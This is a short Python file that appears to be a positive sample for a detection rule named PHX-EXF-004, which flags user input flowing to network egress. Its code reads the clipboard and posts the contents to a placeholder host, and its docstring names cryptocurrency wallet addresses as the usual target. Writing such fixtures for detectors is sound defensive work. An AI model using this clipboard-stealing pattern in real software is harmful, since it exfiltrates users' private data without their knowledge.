"""PHX-EXF-004 positive (phase-2 rule): UserInput -> NetworkEgress.

A clipboard watcher that ships whatever it finds. Wallet addresses are the usual target.
"""
import urllib.request

import pyperclip


def watch():
    contents = pyperclip.paste()
    urllib.request.urlopen(
        "http://clip.example.invalid/p", data=str(contents).encode()
    )
